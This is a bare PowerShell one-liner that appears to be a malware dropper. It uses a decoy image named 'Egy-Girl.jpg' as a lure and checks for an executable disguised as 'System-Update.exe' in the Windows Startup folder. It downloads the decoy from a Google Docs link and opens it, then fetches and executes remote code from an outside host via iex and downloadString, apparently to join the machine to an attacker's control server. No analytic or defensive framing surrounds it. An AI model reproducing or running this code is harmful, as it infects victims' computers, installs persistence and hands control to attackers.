
$FILE = "$env:temp\Egy-Girl.jpg"; if ((Test-Path $FILE) -and (Test-Path "$Home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\System-Update.exe")){start $FILE}else{$URL = "https://docs.google.com/uc?authuser=0&id=0B4PrpiBCQjnONGpZVnN2TVVkbFk&export=download"; (New-Object Net.WebClient).DownloadFile($URL,$FILE);start $FILE;iex(New-Object net.webclient).downloadString('http://doit.atspace.tv/404.php?Join')}

